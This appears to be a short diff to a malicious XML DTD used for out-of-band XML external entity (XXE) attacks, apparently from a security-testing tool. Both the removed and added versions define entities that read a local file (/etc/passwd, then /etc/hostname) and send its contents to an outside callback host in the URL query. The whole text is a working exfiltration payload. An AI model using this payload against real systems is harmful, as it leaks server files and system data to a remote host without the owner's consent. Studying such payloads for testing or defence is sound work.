@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "file:///etc/passwd">
-<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://9gqgdha5fnpisswf8lc52hy6axgo4msb.net-spi.com/?x=%file;'>">
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://mndtkuhim0wvz53sfyji9u5jhan1byzn.net-spi.com/?x=%file;'>">
 %eval;
-%exfiltrate;
+%exfil;
